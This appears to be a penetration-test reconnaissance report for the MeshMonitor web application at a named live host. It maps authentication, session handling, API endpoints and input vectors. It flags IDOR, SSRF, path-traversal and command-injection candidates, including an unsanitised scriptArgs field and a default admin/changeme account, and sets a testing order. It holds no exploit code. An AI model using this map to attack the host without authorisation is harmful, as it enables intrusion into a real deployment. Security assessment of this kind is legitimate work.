# Reconnaissance Deliverable: MeshMonitor Application

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the MeshMonitor application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

**Application Overview:**
MeshMonitor is a sophisticated Node.js/TypeScript web application designed for monitoring and managing Meshtastic mesh networks. It serves as a central hub for visualizing node locations, managing messages, monitoring telemetry, and configuring Meshtastic devices.

**Core Technology Stack:**
- **Frontend:** React with TypeScript, Leaflet for mapping, TanStack Query for state management
- **Backend:** Node.js/Express with TypeScript
- **Database:** Multi-database support (SQLite, PostgreSQL, MySQL) via Drizzle ORM
- **Authentication:** Session-based authentication with OIDC/OAuth support, MFA (TOTP), and API tokens
- **Device Communication:** Protobuf-based Meshtastic protocol via serial/TCP/Bluetooth connections
- **Infrastructure:** Self-hosted application, designed for deployment behind reverse proxy

**Primary Attack Surface Components:**
1. **Web Application:** React SPA with 150+ API endpoints serving the main user interface
2. **REST API v1:** Bearer token-authenticated API for external integrations
3. **WebSocket Server:** Real-time updates via Socket.io with session-based authentication
4. **Admin Interface:** Powerful device control and configuration management
5. **Script Execution Engine:** Custom automation via JavaScript/Python/Shell scripts
6. **OIDC Integration:** External identity provider support for enterprise deployments

**Target URL:** https://mesh.yeraze.online

**Key Security Observations:**
- Comprehensive permission system with 27+ granular resources
- Two-tier role model (Admin vs Regular User) with optional anonymous access
- Strong authentication mechanisms including MFA and OIDC
- Extensive input validation throughout the codebase
- CSRF protection using double-submit cookie pattern
- Rate limiting on authentication and sensitive endpoints

## 2. Technology & Service Map

**Frontend Technologies:**
- **Framework:** React 18 with TypeScript
- **Build Tool:** Vite
- **State Management:** TanStack Query (React Query) for server state
- **Mapping:** Leaflet with OpenStreetMap tiles
- **UI Components:** Custom components with Headless UI
- **Authentication Libraries:** Custom AuthContext with session-based auth
- **WebSocket:** Socket.io-client for real-time updates
- **Charting:** Recharts for telemetry visualization
- **Form Handling:** React Hook Form
- **HTTP Client:** Native fetch with custom hooks (useAuthFetch, useCsrfFetch)

**Backend Technologies:**
- **Runtime:** Node.js
- **Language:** TypeScript
- **Framework:** Express.js
- **ORM:** Drizzle ORM (multi-database abstraction)
- **Session:** express-session with multiple store backends
- **Authentication:** Custom middleware + openid-client for OIDC
- **MFA:** otplib for TOTP, qrcode for QR generation
- **WebSocket:** Socket.io for real-time communication
- **Serialization:** Protobuf (@buf/meshtastic_protobufs) for device communication
- **Security:** Helmet.js, CORS middleware, custom CSRF implementation
- **Rate Limiting:** express-rate-limit
- **Validation:** Custom validators throughout codebase

**Infrastructure:**
- **Hosting:** Self-hosted (deployment method varies)
- **Reverse Proxy Support:** Configurable BASE_URL and trust-proxy settings
- **CDN:** None observed (static assets served directly)
- **Database Options:**
  - **SQLite** (default): better-sqlite3, single-file database
  - **PostgreSQL**: pg library with Drizzle ORM
  - **MySQL/MariaDB**: mysql2 library with Drizzle ORM
- **Session Storage:**
  - **SQLite**: Custom session store with sessions.db
  - **PostgreSQL**: connect-pg-simple
  - **MySQL**: express-mysql-session

**Identified Subdomains:**
- Primary: mesh.yeraze.online (observed in browser)
- No additional subdomains discovered during reconnaissance

**Open Ports & Services:**
- **443/HTTPS**: Web application (primary interface)
- **Port 80/HTTP**: Likely redirects to HTTPS (standard configuration)
- Backend services (database, Meshtastic device connection) are internal and not exposed

## 3. Authentication & Session Management Flow

**Entry Points:**
- `/api/auth/login` - Local username/password authentication
- `/api/auth/oidc/login` - OpenID Connect/OAuth 2.0 authentication initiation
- `/api/auth/oidc/callback` - OIDC callback handler
- API Token authentication via `Authorization: Bearer <token>` header (for v1 API)

**Authentication Mechanisms:**

### 3.1 Local Authentication Flow
**File:** `/repos/meshmonitor/src/server/routes/authRoutes.ts:211`

**Step-by-Step Process:**
1. **Credential Submission:** Client sends `POST /api/auth/login` with `{username, password}` in JSON body
2. **Credential Validation:**
   - Username lookup in database
   - Bcrypt password verification (12 salt rounds) at `/repos/meshmonitor/src/server/auth/localAuth.ts:372-390`
   - Password hash comparison using `bcrypt.compare()`
3. **MFA Check:** If user has MFA enabled (`mfaEnabled: true`):
   - Server stores `pendingMfaUserId` in session
   - Returns `{requireMfa: true}` to client
   - Client prompts for TOTP code or backup code
4. **MFA Verification:** Client sends `POST /api/auth/verify-mfa` with token
   - TOTP verification via `otplib` (30-second window, ±1 step tolerance)
   - Backup code verification and consumption (one-time use)
5. **Session Creation:**
   - Session data populated: `userId`, `username`, `authProvider: 'local'`, `isAdmin`
   - Session stored in configured backend (SQLite/PostgreSQL/MySQL)
   - Session cookie sent to client: `meshmonitor.sid` (configurable name)
6. **Client State Update:** Auth status refreshed via `GET /api/auth/status`

### 3.2 OIDC Authentication Flow
**File:** `/repos/meshmonitor/src/server/routes/authRoutes.ts:439`

**Step-by-Step Process:**
1. **Initiation:** Client calls `GET /api/auth/oidc/login`
2. **PKCE Parameter Generation:**
   - State (CSRF protection)
   - Code verifier (PKCE security)
   - Nonce (replay protection)
   - All stored in session for callback validation
3. **Authorization URL Generation:** Server returns OIDC provider URL
4. **User Redirect:** Client redirects to OIDC provider
5. **External Authentication:** User authenticates with identity provider
6. **Callback:** OIDC provider redirects to `/api/auth/oidc/callback?code=...&state=...`
7. **State Validation:** Server validates state parameter against session
8. **Token Exchange:** Authorization code exchanged for ID token using PKCE code_verifier
9. **ID Token Validation:** Signature and claims verified via `openid-client` library
10. **User Lookup/Creation:**
    - Lookup by `oidcSubject` (sub claim)
    - If not found and auto-create enabled: Create new user with default permissions
    - If email matches local user: Migrate to OIDC (preserves permissions)
11. **Session Creation:** Same as local auth, but with `authProvider: 'oidc'`
12. **Redirect:** User redirected to application home page

### 3.3 Session Token Storage

**Server-Side Storage:**
- **Location:** Configured database (SQLite sessions.db, PostgreSQL session table, or MySQL sessions table)
- **Session Data Structure:**
  ```typescript
  {
    userId: number,
    username: string,
    authProvider: 'local' | 'oidc',
    isAdmin: boolean,
    csrfToken: string,
    pendingMfaUserId?: number,  // MFA two-step flow
    oidcState?: string,          // OIDC flow state
    oidcCodeVerifier?: string,   // PKCE verifier
    oidcNonce?: string           // OIDC nonce
  }
  ```
- **Session ID:** Randomly generated by express-session
- **Expiry:** Configurable via `SESSION_MAX_AGE` (default: 30 days)
- **Rolling:** Session expiry resets on each request (if `SESSION_ROLLING=true`)

**Client-Side Storage:**
- **Cookie Name:** `meshmonitor.sid` (configurable via `SESSION_COOKIE_NAME`)
- **Cookie Attributes:**
  - `httpOnly: true` (prevents JavaScript access)
  - `secure: <configurable>` (HTTPS-only if `COOKIE_SECURE=true`)
  - `sameSite: 'lax'` or `'strict'` (configurable)
  - `maxAge: <SESSION_MAX_AGE>`
- **Automatic Handling:** Browser sends cookie with all requests via `credentials: 'include'`

### 3.4 Session Validation on Subsequent Requests

**Middleware Chain:**
File: `/repos/meshmonitor/src/server/auth/authMiddleware.ts`

1. **Session Middleware:** Express-session loads session data from database using cookie ID
2. **Authentication Middleware Options:**
   - **`optionalAuth()`** (lines 17-46): Loads user if authenticated, falls back to anonymous user
   - **`requireAuth()`** (lines 52-96): Requires valid session, returns 401 if not authenticated
   - **`requireAdmin()`** (lines 175-218): Requires authenticated user with `isAdmin=true`
   - **`requirePermission(resource, action)`** (lines 102-169): Checks specific permission
   - **`requireAPIToken()`** (lines 238-298): Validates Bearer token for v1 API

3. **User Object Attachment:** Middleware attaches `req.user` with full user details from database
4. **Permission Check:** If using `requirePermission()`, queries permissions table for user access

**Code Pointers:**
- Main server setup: `/repos/meshmonitor/src/server/server.ts:229-236`
- Session configuration: `/repos/meshmonitor/src/server/auth/sessionConfig.ts`
- Authentication middleware: `/repos/meshmonitor/src/server/auth/authMiddleware.ts`
- Local auth logic: `/repos/meshmonitor/src/server/auth/localAuth.ts`
- OIDC auth logic: `/repos/meshmonitor/src/server/auth/oidcAuth.ts`
- MFA service: `/repos/meshmonitor/src/server/services/mfa.ts`

### 3.5 Role Assignment Process

**Initial Admin Creation:**
File: `/repos/meshmonitor/src/services/database.ts:8533-8666`

On **first run**, the system automatically creates an admin account:
- Username: `admin` (configurable via `ADMIN_USERNAME`)
- Password: `changeme` (hardcoded default)
- Display name: "Administrator"
- Admin flag: `true`
- All default permissions granted automatically

**Anonymous User Creation:**
File: `/repos/meshmonitor/src/services/database.ts:8668-8719`

Automatically created with:
- Username: `anonymous`
- Password: Random generated (not disclosed)
- Admin flag: `false`
- Limited read permissions: dashboard, nodes, info

**Role Determination Methods:**

1. **During Local User Creation** (by admin):
   - File: `/repos/meshmonitor/src/server/routes/userRoutes.ts:79-110`
   - Admin specifies `isAdmin` flag in request body
   - Created user starts with specified role
   - Default permissions granted based on role

2. **During OIDC First Login** (auto-registration):
   - File: `/repos/meshmonitor/src/server/auth/oidcAuth.ts:287`
   - Always created as regular user (`isAdmin: false`)
   - Default regular user permissions granted
   - Cannot be created as admin via OIDC (security measure)

3. **Admin Promotion:**
   - File: `/repos/meshmonitor/src/server/routes/userRoutes.ts:295-348`
   - Endpoint: `PUT /api/users/:id/admin`
   - Existing admin can toggle `isAdmin` flag for any user
   - Cannot demote yourself (self-protection)
   - Logged to audit trail

### 3.6 Privilege Storage & Validation

**Storage Location:**
- **Primary:** `isAdmin` boolean field in `users` table
- **Granular:** Permission records in `permissions` table linking userId to resource+action
- **Session Cache:** `req.session.isAdmin` stored in session for quick access

**Database Schema:**
File: `/repos/meshmonitor/src/db/schema/auth.ts`
- Users table (lines 12-48): Contains `isAdmin` column
- Permissions table (lines 52-72): Contains resource-level permissions

**Validation Points:**
1. **Every Request:** Session middleware loads `req.session.userId`
2. **Auth Check:** Middleware queries database for fresh user data
3. **Permission Check:**
   - If `user.isAdmin === true`: Bypass all permission checks (lines 138-140 in authMiddleware.ts)
   - If regular user: Query permissions table for specific resource+action
4. **No Cache Staleness:** Fresh user data fetched from database on each authenticated request

**Cache/Session Persistence:**
- Session lifetime: Configurable (default 30 days)
- Rolling expiry: Resets on each request if `SESSION_ROLLING=true`
- Privilege changes take effect immediately (no logout required)
- Admin flag stored in session but re-validated against database

**Code Pointers:**
- Permission validation: `/repos/meshmonitor/src/server/auth/authMiddleware.ts:102-169`
- Admin bypass logic: `/repos/meshmonitor/src/server/auth/authMiddleware.ts:138-140`
- User update: `/repos/meshmonitor/src/server/routes/userRoutes.ts:114-170`

### 3.7 Role Switching & Impersonation

**Finding:** No role switching or impersonation features are implemented in this application.

The system does NOT have:
- "Switch user" functionality
- "Act as" or "masquerade" capabilities
- Temporary privilege elevation mechanisms
- Role delegation features
- "Sudo mode" functionality

Once logged in, a user's role (`isAdmin` flag) remains constant for the session duration unless changed by another admin and re-validated on the next request.

## 4. API Endpoint Inventory

**Network Surface Focus:** This inventory includes only API endpoints accessible through the target web application at https://mesh.yeraze.online. Local-only scripts, CLI tools, and build utilities are excluded.

**Total Endpoints Discovered:** 200+ API endpoints across multiple categories

**Key Authorization Patterns:**
- **anon:** No authentication required
- **user:** Requires authentication (any authenticated user)
- **admin:** Requires authentication + `isAdmin=true`
- **permission:** Requires authentication + specific resource permission (e.g., `nodes:write`)

### 4.1 Authentication & User Management Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/auth/login | anon | None | None | Local username/password authentication. `/repos/meshmonitor/src/server/routes/authRoutes.ts:211` |
| POST | /api/auth/logout | user | None | Session | Destroys current session. `/repos/meshmonitor/src/server/routes/authRoutes.ts:294` |
| GET | /api/auth/status | anon | None | Optional session | Returns current auth status and permissions. `/repos/meshmonitor/src/server/routes/authRoutes.ts:26` |
| POST | /api/auth/verify-mfa | anon | userId (via session) | pendingMfaUserId in session | Completes MFA verification for login. `/repos/meshmonitor/src/server/routes/authRoutes.ts:320` |
| POST | /api/auth/change-password | user | None | requireAuth() | Changes authenticated user's password. `/repos/meshmonitor/src/server/routes/authRoutes.ts:398` |
| GET | /api/auth/oidc/login | anon | None | None | Initiates OIDC authentication flow. `/repos/meshmonitor/src/server/routes/authRoutes.ts:439` |
| GET | /api/auth/oidc/callback | anon | None | State parameter validation | OIDC callback handler. `/repos/meshmonitor/src/server/routes/authRoutes.ts:475` |
| GET | /api/users | admin | None | requireAdmin() | List all users in system. `/repos/meshmonitor/src/server/routes/userRoutes.ts:20` |
| GET | /api/users/:id | admin | id (user ID) | requireAdmin() | Get specific user details. `/repos/meshmonitor/src/server/routes/userRoutes.ts:48` |
| POST | /api/users | admin | None | requireAdmin() | Create new user account. `/repos/meshmonitor/src/server/routes/userRoutes.ts:79` |
| PUT | /api/users/:id | admin | id (user ID) | requireAdmin() + self-protection | Update user details. `/repos/meshmonitor/src/server/routes/userRoutes.ts:114` |
| DELETE | /api/users/:id | admin | id (user ID) | requireAdmin() + self-protection | Soft delete user (deactivate). `/repos/meshmonitor/src/server/routes/userRoutes.ts:172` |
| DELETE | /api/users/:id/permanent | admin | id (user ID) | requireAdmin() + self-protection | Permanently delete user. `/repos/meshmonitor/src/server/routes/userRoutes.ts:222` |
| PUT | /api/users/:id/admin | admin | id (user ID) | requireAdmin() + self-demotion protection | Toggle admin status for user. `/repos/meshmonitor/src/server/routes/userRoutes.ts:295` |
| PUT | /api/users/:id/permissions | admin | id (user ID) | requireAdmin() | Update user permissions. `/repos/meshmonitor/src/server/routes/userRoutes.ts:423` |
| GET | /api/users/:id/permissions | admin | id (user ID) | requireAdmin() | Get user permissions. `/repos/meshmonitor/src/server/routes/userRoutes.ts:404` |

### 4.2 Node Management Endpoints (IDOR Candidates)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | /api/nodes | user (optional) | None | optionalAuth() + channel permissions | Get all nodes (filtered by channel access). `/repos/meshmonitor/src/server/server.ts:743` |
| GET | /api/nodes/:nodeId/position-history | user (optional) | nodeId | optionalAuth() + channel permissions | Get position history for specific node. `/repos/meshmonitor/src/server/server.ts:795` |
| POST | /api/nodes/:nodeId/favorite | user | nodeId | requirePermission('nodes', 'write') | Mark node as favorite. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:916` |
| POST | /api/nodes/:nodeId/ignored | user | nodeId | requirePermission('nodes', 'write') | Add node to ignored list. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:1057` |
| DELETE | /api/ignored-nodes/:nodeId | user | nodeId | requirePermission('nodes', 'write') | Remove node from ignored list. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:1214` |
| POST | /api/nodes/:nodeId/position-override | user | nodeId | requirePermission('nodes', 'write') | Set custom position for node. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:1312` |
| DELETE | /api/nodes/:nodeId/position-override | user | nodeId | requirePermission('nodes', 'write') | Remove position override. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:1419` |
| DELETE | /api/nodes/:nodeNum | user | nodeNum | requirePermission('messages', 'write') | Delete all data for node. `/repos/meshmonitor/src/server/routes/messageRoutes.ts:395` |

### 4.3 Message Endpoints (IDOR Candidates)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | /api/messages | user (optional) | None | optionalAuth() + channel permissions | Get all messages (filtered by permissions). `/repos/meshmonitor/src/server/server.ts:1697` |
| GET | /api/messages/channel/:channel | user (optional) | channel | optionalAuth() + channel-specific permission | Get messages for specific channel. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:1770` |
| GET | /api/messages/direct/:nodeId1/:nodeId2 | user | nodeId1, nodeId2 | requirePermission('messages', 'read') | Get direct messages between nodes. **IDOR Risk**. `/repos/meshmonitor/src/server/server.ts:1807` |
| DELETE | /api/messages/:id | user | id (message ID) | Channel-specific write permission | Delete specific message. **IDOR Risk**. `/repos/meshmonitor/src/server/routes/messageRoutes.ts:81` |
| POST | /api/messages/send | user (optional) | None | optionalAuth() + channel write permission | Send message to mesh. `/repos/meshmonitor/src/server/server.ts:2589` |
| DELETE | /api/messages/channels/:channelId | user | channelId | requireChannelsWrite | Delete all messages in channel. `/repos/meshmonitor/src/server/routes/messageRoutes.ts:187` |

### 4.4 Admin & Configuration Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/admin/commands | admin | None | requireAdmin() | Execute admin commands on device. **High Risk**. `/repos/meshmonitor/src/server/server.ts:7183` |
| POST | /api/admin/import-config | admin | None | requireAdmin() | Import device configuration. `/repos/meshmonitor/src/server/server.ts:7035` |
| POST | /api/admin/export-config | admin | None | requireAdmin() | Export device configuration. `/repos/meshmonitor/src/server/server.ts:6906` |
| POST | /api/device/reboot | user | None | requirePermission('configuration', 'write') | Reboot Meshtastic device. `/repos/meshmonitor/src/server/server.ts:6076` |
| PUT | /api/channels/:id | user | id (channel ID 0-7) | requirePermission('channel_0', 'write') | Update channel configuration. `/repos/meshmonitor/src/server/server.ts:2106` |
| POST | /api/config/device | user | None | requirePermission('configuration', 'write') | Update device config. `/repos/meshmonitor/src/server/server.ts:5898` |

### 4.5 Script & Automation Endpoints (High Risk)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/scripts/import | user | None | requirePermission('settings', 'write') | Upload executable script (.js/.py/.sh). **File Upload**. `/repos/meshmonitor/src/server/server.ts:9007` |
| POST | /api/scripts/test | user | None | requirePermission('settings', 'read') | Test script execution. **Command Exec**. `/repos/meshmonitor/src/server/server.ts:8522` |
| DELETE | /api/scripts/:filename | user | filename | requirePermission('settings', 'write') | Delete script file. **Path Traversal Risk**. `/repos/meshmonitor/src/server/server.ts:9102` |
| POST | /api/settings | user | None | requirePermission('settings', 'write') | Update app settings (includes script triggers). **Command Injection Risk**. `/repos/meshmonitor/src/server/server.ts:4885` |

### 4.6 API Token Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | /api/token | user | None | requireAuth() | Get current user's API token info. `/repos/meshmonitor/src/server/routes/apiTokenRoutes.ts:18` |
| POST | /api/token/generate | user | None | requireAuth() | Generate new API token (revokes old). `/repos/meshmonitor/src/server/routes/apiTokenRoutes.ts:79` |
| DELETE | /api/token | user | None | requireAuth() | Revoke API token. `/repos/meshmonitor/src/server/routes/apiTokenRoutes.ts:151` |

### 4.7 Audit & Security Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | /api/audit | admin | None | requireAdmin() | Get audit logs with filtering. `/repos/meshmonitor/src/server/routes/auditRoutes.ts:18` |
| POST | /api/audit/cleanup | admin | None | requirePermission('audit', 'write') + explicit admin check | Cleanup old audit logs. `/repos/meshmonitor/src/server/routes/auditRoutes.ts:137` |
| POST | /api/security/scanner/scan | user | None | requirePermission('security', 'write') | Trigger security scan. `/repos/meshmonitor/src/server/routes/securityRoutes.ts:106` |
| GET | /api/security/issues | user | None | requirePermission('security', 'read') | Get security issues. `/repos/meshmonitor/src/server/routes/securityRoutes.ts:19` |

### 4.8 MFA Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/mfa/setup | user | None | requireAuth() + authLimiter | Setup MFA (generates TOTP secret). `/repos/meshmonitor/src/server/routes/mfaRoutes.ts:36` |
| POST | /api/mfa/verify-setup | user | None | requireAuth() + authLimiter | Verify and enable MFA. `/repos/meshmonitor/src/server/routes/mfaRoutes.ts:87` |
| POST | /api/mfa/disable | user | None | requireAuth() + authLimiter | Disable MFA for current user. `/repos/meshmonitor/src/server/routes/mfaRoutes.ts:142` |
| DELETE | /api/users/:id/mfa | admin | id (user ID) | requireAdmin() | Force-disable MFA for any user. `/repos/meshmonitor/src/server/routes/userRoutes.ts:633` |

**Note:** Complete endpoint list (200+ total) available in Task Agent output. Above table focuses on security-critical and IDOR-candidate endpoints.

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the target web application's network interface are included. Local-only scripts, build tools, and development utilities are excluded.

### 5.1 URL Parameters (Query Strings)

**Authentication & Routing:**
- `/api/auth/oidc/callback?code=<value>&state=<value>` - OAuth callback parameters
  - File: `/repos/meshmonitor/src/server/routes/authRoutes.ts:475`
  - Validation: State parameter validated against session

**Pagination & Filtering:**
- `/api/messages?limit=<int>&offset=<int>` - Message pagination
  - File: `/repos/meshmonitor/src/server/server.ts:1697`
  - Validation: Limit clamped to 1-500, offset clamped to 0-50000

- `/api/messages/channel/:channel?limit=<int>&offset=<int>` - Channel message pagination
  - File: `/repos/meshmonitor/src/server/server.ts:1770`
  - Validation: Range clamping applied

- `/api/nodes/active?days=<int>` - Active nodes time filter
  - File: `/repos/meshmonitor/src/server/server.ts:758`
  - Validation: Integer parsing with default

- `/api/nodes/:nodeId/position-history?hours=<int>` - Position history time range
  - File: `/repos/meshmonitor/src/server/server.ts:795`
  - Validation: Integer parsing

**Audit Log Filtering:**
- `/api/audit?limit=<int>&offset=<int>&userId=<int>&action=<string>&resource=<string>&startDate=<timestamp>&endDate=<timestamp>&search=<string>`
  - File: `/repos/meshmonitor/src/server/routes/auditRoutes.ts:18`
  - Validation: Limit max 1000, integer parsing for numeric fields

**Link Preview:**
- `/api/link-preview?url=<url>` - External URL for metadata extraction
  - File: `/repos/meshmonitor/src/server/routes/linkPreviewRoutes.ts:59`
  - Validation: URL parsing, HTTP/HTTPS protocol only
  - **SSRF Risk:** Fetches external URLs

**Script Content Proxy:**
- `/api/script-content?url=<github_url>` - Proxy for GitHub raw content
  - File: `/repos/meshmonitor/src/server/routes/scriptContentRoutes.ts:128`
  - Validation: Strict GitHub raw.githubusercontent.com validation, path traversal checks

### 5.2 URL Path Parameters (Route Parameters)

**User Management:**
- `/api/users/:id` - User ID (integer)
  - Files: Multiple in `/repos/meshmonitor/src/server/routes/userRoutes.ts`
  - Validation: Integer parsing with NaN check
  - **IDOR Risk:** User-specific operations

**Node Operations:**
- `/api/nodes/:nodeId/*` - Node identifier (hex string or numeric)
  - Files: Multiple in `/repos/meshmonitor/src/server/server.ts`
  - Validation: Node ID to nodeNum conversion
  - **IDOR Risk:** Node-specific operations

**Message Operations:**
- `/api/messages/:id` - Message ID (string/UUID)
  - File: `/repos/meshmonitor/src/server/routes/messageRoutes.ts:81`
  - **IDOR Risk:** Message deletion

- `/api/messages/channel/:channel` - Channel number (0-7)
  - File: `/repos/meshmonitor/src/server/server.ts:1770`
  - Validation: Channel permission checks

**Script Operations:**
- `/api/scripts/:filename` - Script filename
  - File: `/repos/meshmonitor/src/server/server.ts:9102`
  - Validation: Path traversal protection needed
  - **Path Traversal Risk**

**Channel Database:**
- `/api/channel-database/:id` - Channel database ID (integer)
  - File: `/repos/meshmonitor/src/server/routes/channelDatabaseRoutes.ts`
  - **IDOR Risk:** Channel configuration access

### 5.3 POST Body Fields (JSON)

**Authentication:**
- `POST /api/auth/login` Body: `{username, password}`
  - File: `/repos/meshmonitor/src/server/routes/authRoutes.ts:211`
  - Validation: Required field checks, bcrypt comparison

- `POST /api/auth/verify-mfa` Body: `{token}` or `{backupCode}`
  - File: `/repos/meshmonitor/src/server/routes/authRoutes.ts:320`
  - Validation: TOTP verification via otplib

- `POST /api/auth/change-password` Body: `{currentPassword, newPassword}`
  - File: `/repos/meshmonitor/src/server/routes/authRoutes.ts:398`
  - Validation: Password verification, bcrypt hashing

**User Management:**
- `POST /api/users` Body: `{username, password, email, displayName, isAdmin}`
  - File: `/repos/meshmonitor/src/server/routes/userRoutes.ts:79`
  - Validation: Required field checks
  - **Privilege Escalation Risk:** isAdmin parameter

- `PUT /api/users/:id/permissions` Body: `{permissions: {resource: {viewOnMap, read, write}}}`
  - File: `/repos/meshmonitor/src/server/routes/userRoutes.ts:423`
  - Validation: Permission object structure validation
  - **Authorization Risk:** Permission manipulation

**Node Configuration:**
- `POST /api/nodes/:nodeId/position-override` Body: `{enabled, latitude, longitude, altitude, isPrivate}`
  - File: `/repos/meshmonitor/src/server/server.ts:1312`
  - Validation: Range checks for coordinates, boolean validation

- `POST /api/nodes/:nodeId/favorite` Body: `{isFavorite, syncToDevice, destinationNodeNum}`
  - File: `/repos/meshmonitor/src/server/server.ts:916`
  - Validation: Boolean type checks

**Message Sending:**
- `POST /api/messages/send` Body: `{to, channel, text, wantAck}`
  - File: `/repos/meshmonitor/src/server/server.ts:2589`
  - Validation: Channel permission checks
  - **XSS Risk:** Text content rendering

**Settings & Configuration:**
- `POST /api/settings` Body: Large configuration object including:
  - `autoResponderTriggers` - Array with `scriptPath` and `scriptArgs`
  - `timerTriggers` - Array with `scriptPath` and `scriptArgs`
  - `geofenceTriggers` - Array with `scriptPath` and `scriptArgs`
  - File: `/repos/meshmonitor/src/server/server.ts:4885`
  - Validation: Script path validation (must start with /data/scripts/, no ..)
  - **CRITICAL COMMAND INJECTION:** `scriptArgs` field NOT sanitized - flows to child_process execution

**Script Upload (RAW BINARY):**
- `POST /api/scripts/import` Header: `x-filename`, Body: Raw file content
  - File: `/repos/meshmonitor/src/server/server.ts:9007`
  - Validation: Extension whitelist (.js, .mjs, .py, .sh), filename sanitization
  - **File Upload Risk:** Executable scripts accepted

**Admin Commands:**
- `POST /api/admin/commands` Body: `{command, nodeNum, params}`
  - File: `/repos/meshmonitor/src/server/server.ts:7183`
  - Validation: Command name validation, parameter validation per command
  - **High Risk:** Device control functionality

**Channel Configuration:**
- `PUT /api/channels/:id` Body: `{name, psk, role, uplinkEnabled, downlinkEnabled, positionPrecision}`
  - File: `/repos/meshmonitor/src/server/server.ts:2106`
  - Validation: Name length (max 11), PSK string validation, role range (0-2), precision range (0-32)

**HTTP Trigger Test:**
- `POST /api/http/test` Body: `{url}`
  - File: `/repos/meshmonitor/src/server/server.ts:8939`
  - Validation: URL parsing, protocol whitelist (http/https only)
  - **SSRF Risk:** Fetches arbitrary URLs

**Channel Database:**
- `POST /api/channel-database` Body: `{name, psk, description, isEnabled}`
  - File: `/repos/meshmonitor/src/server/routes/channelDatabaseRoutes.ts:175`
  - Validation: Name length (1-20), PSK base64 validation (16-256 bytes decoded), description max 200

### 5.4 HTTP Headers

**CSRF Protection:**
- `X-CSRF-Token` - CSRF token for state-changing requests
  - File: `/repos/meshmonitor/src/server/middleware/csrf.ts:73`
  - Validation: Constant-time comparison against session token
  - Required for: POST, PUT, PATCH, DELETE (with exceptions)

**Script Upload:**
- `x-filename` - Original filename for script upload
  - File: `/repos/meshmonitor/src/server/server.ts:9013`
  - Validation: path.basename() sanitization, extension whitelist

**API Authentication:**
- `Authorization: Bearer <token>` - API token authentication for v1 API
  - File: `/repos/meshmonitor/src/server/auth/authMiddleware.ts:238`
  - Validation: Token prefix validation, bcrypt hash verification

**Proxy Headers (informational):**
- `X-Forwarded-For` / `X-Real-IP` - Client IP detection (rate limiting, audit logs)
- `Origin` / `Referer` - CORS origin validation

### 5.5 Cookie Values

**Session Cookie:**
- Cookie name: `meshmonitor.sid` (configurable)
  - File: `/repos/meshmonitor/src/server/auth/sessionConfig.ts`
  - Processing: Session ID used to load session data from database
  - Contains: userId, username, authProvider, isAdmin, csrfToken, etc.

**No other application cookies processed.**

### 5.6 WebSocket Messages (Real-time Communication)

**Connection:** Socket.io at `/socket.io/`
- Authentication: Shares Express session via handshake middleware
  - File: `/repos/meshmonitor/src/server/services/webSocketService.ts:108-140`
- Validation: Requires valid `session.userId`

**Client → Server Events:** Limited observation (requires authentication)
**Server → Client Events:** Node updates, message notifications, connection status, telemetry updates

### 5.7 File Upload Vectors

**Script Import:**
- Endpoint: `POST /api/scripts/import`
- Method: Raw binary upload with `x-filename` header
- Accepted Extensions: .js, .mjs, .py, .sh
- Size Limit: 5MB (line 9010 in server.ts)
- Destination: `/data/scripts/` directory
- **HIGH RISK:** Executable scripts uploaded to server

**No other file upload endpoints discovered.**

## 6. Network & Interaction Map

**Network Surface Focus:** This section maps only network-accessible components reachable through the deployed application at https://mesh.yeraze.online.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|---|---|---|---|---|---|
| MeshMonitor-Web | ExternAsset | Internet | Browser/React | None | User's web browser accessing the application |
| MeshMonitor-App | Service | Edge | Node/Express/TypeScript | PII, Tokens, Messages, Telemetry | Main web application server |
| Database | DataStore | Data | SQLite/PostgreSQL/MySQL | PII, Tokens, Messages, Sessions, Audit | Primary data storage |
| SessionStore | DataStore | Data | Same as Database | Sessions, CSRF Tokens | Session persistence (may be same DB or separate) |
| OIDC-Provider | ThirdParty | Internet | OAuth/OIDC | User Identity Claims | External identity provider (optional) |
| Meshtastic-Device | ExternAsset | Edge | Meshtastic Firmware | Mesh Messages, Node Data | Hardware device connected via serial/TCP/BLE |
| Push-Service | ThirdParty | Internet | Web Push API | Push Subscriptions | Browser push notification service |
